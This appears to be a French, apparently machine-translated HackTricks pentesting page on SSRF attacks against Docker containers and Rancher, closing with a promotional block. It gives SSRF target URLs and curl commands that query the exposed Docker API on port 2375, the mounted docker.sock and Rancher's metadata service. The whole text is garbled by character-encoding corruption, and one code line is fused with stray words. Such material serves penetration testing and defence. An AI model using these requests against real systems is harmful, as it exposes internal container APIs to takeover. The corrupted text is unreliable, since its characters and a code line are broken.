Docker est une plateforme de conteneurisation qui permet de cr√©er, d√©ployer et ex√©cuter des applications dans des conteneurs. Les conteneurs sont des environnements isol√©s qui contiennent tout ce dont une application a besoin pour fonctionner, y compris le code, les biblioth√®ques et les d√©pendances. Docker est souvent utilis√© pour cr√©er des environnements de d√©veloppement et de test, ainsi que pour d√©ployer des applications dans des environnements de production.

Les attaques SSRF contre les conteneurs Docker peuvent √™tre particuli√®rement dangereuses, car les conteneurs sont souvent utilis√©s pour ex√©cuter des applications sensibles, telles que des bases de donn√©es et des serveurs Web. Si un attaquant peut exploiter une vuln√©rabilit√© SSRF pour acc√©der √† ces applications, il peut potentiellement voler des donn√©es sensibles ou prendre le contr√¥le complet du syst√®me.

Il est important de noter que les attaques SSRF contre les conteneurs Docker peuvent √™tre plus difficiles √† exploiter que les attaques SSRF contre les serveurs Web traditionnels. Cela est d√ª au fait que les conteneurs sont souvent configur√©s pour n'√©couter que sur des ports sp√©cifiques, ce qui peut limiter les options d'attaque pour un attaquant. Cependant, il est toujours important de prendre des mesures pour prot√©ger les conteneurs Docker contre les attaques SSRF, telles que la configuration de r√®gles de pare-feu pour limiter l'acc√®s aux ports sensibles et la mise en place de contr√¥les d'acc√®s pour les applications sensibles.
```
http://127.0.0.1:2375/v1.24/containers/jsonSimple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```
## Rancher <a href="#8cb7" id="8cb7"></a>

Rancher est une plateforme de gestion de conteneurs qui permet de d√©ployer et de g√©rer des clusters Kubernetes. Elle est souvent utilis√©e pour g√©rer des environnements de production dans le cloud. Les versions ant√©rieures √† la version 2.5.8 ont √©t√© affect√©es par une vuln√©rabilit√© SSRF qui permettait √† un attaquant de contourner les restrictions de s√©curit√© et d'envoyer des requ√™tes HTTP depuis le serveur vers des ressources internes ou externes. Cette vuln√©rabilit√© a √©t√© corrig√©e dans la version 2.5.8 et les versions ult√©rieures. Si vous utilisez une version ant√©rieure, il est recommand√© de mettre √† jour votre installation Rancher d√®s que possible pour √©viter toute exploitation potentielle de cette vuln√©rabilit√©.
```
curl http://rancher-metadata/<version>/<path>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
